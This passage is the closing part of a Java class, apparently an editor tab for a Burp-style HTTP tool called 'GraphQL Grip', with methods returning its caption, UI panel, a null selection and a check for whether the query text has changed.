    public String caption() {
        return "GraphQL Grip";
    }

    @Override
    public Component uiComponent() {
        return mainPanel;
    }

    @Override
    public Selection selectedData() {
        return null;
    }

    @Override
    public boolean isModified() {
        if (originalRequestBody == null) return false;
        return !originalRequestBody.equals(queryArea.getText());
    }
}
